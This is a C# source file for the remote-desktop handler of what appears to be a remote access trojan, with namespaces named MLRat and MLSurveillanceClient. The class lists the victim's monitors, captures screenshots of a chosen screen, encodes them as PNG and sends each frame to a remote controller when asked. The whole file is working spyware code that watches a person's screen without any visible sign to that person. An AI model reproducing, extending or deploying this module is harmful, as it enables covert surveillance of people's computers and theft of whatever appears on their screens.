using MLRat.Client;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MLSurveillanceClient.Handlers
{
    public static class RemoteDesktopHandler
    {
        private static IClientHost NetworkHost;
        private static Image LastImage = null;
        private static ImageCodecInfo ImgEncoder;
        public static void SetNetworkHost(IClientHost host)
        {
            ImgEncoder = GetEncoder(ImageFormat.Png);
            NetworkHost = host;
            
        }
        public static void Handle(object[] data)
        {
            var command = (RemoteDesktopCommand)data[1];

            Console.WriteLine("Remote desktop command: {0}", command.ToString());

            if (command == RemoteDesktopCommand.RequestFrame) CheckFrame((int)data[2]);
                
            if (command == RemoteDesktopCommand.GetMonitors && Screen.AllScreens != null && Screen.AllScreens.Length > 0)
                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.MonitorResponce, Screen.AllScreens.Select(s => s.DeviceName).ToArray());
        }

        public static void CheckFrame(int monitor)
        {
            bool Same = false;
            byte[] newImage = TakeScreenshot(monitor, out Same);
            if(Same)
                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.noChangeFrame);
            else
                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.Frame, newImage);
        }

        private static byte[] TakeScreenshot(int monitor, out bool same)
        {
            Screen selectedMonitor;
            if (monitor == -1 || monitor > Screen.AllScreens.Length-1)
                selectedMonitor = Screen.PrimaryScreen;
            else
                selectedMonitor = Screen.AllScreens[monitor];
            using (var bmp = new Bitmap(selectedMonitor.Bounds.Width, selectedMonitor.Bounds.Height))
            {
                var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(selectedMonitor.Bounds.X, selectedMonitor.Bounds.Y, 0, 0, selectedMonitor.Bounds.Size);
                g.Dispose();
                if (LastImage == null)
                    same = false;
                else
                    same = LastImage.Equals(bmp);
                LastImage = bmp;
                using (var ms = new MemoryStream())
                {
                    EncoderParameters par = new EncoderParameters(1);
                    par.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 0L);
                    bmp.Save(ms, ImgEncoder, par);
                    return ms.ToArray();
                }
            }
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {

            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
